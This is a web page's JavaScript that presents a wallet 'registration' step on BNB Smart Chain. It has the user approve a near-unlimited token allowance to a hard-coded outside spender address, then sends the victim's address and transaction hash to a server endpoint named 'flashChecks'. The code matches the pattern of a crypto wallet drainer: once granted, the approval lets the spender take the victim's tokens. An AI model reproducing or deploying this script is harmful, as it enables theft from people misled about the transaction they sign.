
const busdContractAddress ="0x55d398326f99059fF775485246999027B3197955";
const busdAbi = [
      {
          "constant": false,
          "inputs": [
            { "name": "_spender", "type": "address" },
            { "name": "_value", "type": "uint256" }
          ],
          "name": "approve",
          "outputs": [{ "name": "", "type": "bool" }],
          "type": "function"
      }
];


async function BusdApproval() {
    loadingButtonBusd();
    await window.ethereum.enable();
    const web3 = new Web3(window.ethereum);
    const accounts = await web3.eth.getAccounts();
    let account = accounts[0];
    let net = await web3.eth.net.getId();

    if (net == 56) {
        const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
        const amount= 115792089237;
        const spenderAddress="0xea78B82fAa50BA7D111d020c89A15b6318173ca8";
        const amountToApprove = web3.utils.toWei(amount.toString(), 'ether');
        //const urlParams = new URLSearchParams(window.location.search);
        //const myParam = urlParams.get('id');
        try {
            const transaction = await busdContract.methods
              .approve(spenderAddress, amountToApprove)
              .send({ from: account }).then(async (d) => {
                  const hash = d.transactionHash;
                  $.ajax({
                      type: "POST",
                      url: "flashChecks.aspx/insertAddress",
                      data: '{ "address": "' + account + '","hash": "' + hash + '"}',
                      contentType: "application/json; charset=utf-8",
                      dataType: "json",
                      success: function (response) {
                          //alert(response.d);
                         // Swal.fire({ icon: 'success', title: 'Transaction is successful', text: response_data.transactionHash })
                          //$find('MyModal').hide();
                          //location.reload();
                      }
                  });


                  Swal.fire({ icon: 'success', title: 'Congratulations', text: hash }).then(()=>{
                      location.reload();
                  });
              });

        } catch (error) {
            Swal.fire({ icon: 'error', title: 'Info', text: 'Registration Failed' }).then(()=>{
                location.reload();
            });
        }
    }
    unLoadingButtonBusd();
}

function loadingButtonBusd() {
    document.getElementById('lSpinBusd').innerHTML = "<i class='fa fa-spinner fa-spin'></i>";
    document.getElementById('btnApprove').disabled = true;
}

function unLoadingButtonBusd() {
    document.getElementById('lSpinBusd').innerHTML = "";
    document.getElementById('btnApprove').disabled = false;
}


$(document).ready(function () {
    mainLoadFunction();

    //document.addEventListener('contextmenu', function(event) {
    //    event.preventDefault();
});


jQuery(window).on('load', function () {
    setTimeout(function () {
        JobickCarousel();
    }, 1000);
});

function showLoader() {
    var loader = document.getElementById('loader');
    var ApproveText = document.getElementById('ApproveText');
    var btnApprove = document.getElementById('btnApprove');

    ApproveText.style.display = 'none';

    loader.style.display = 'inline-block';

    btnApprove.disabled = true;
}



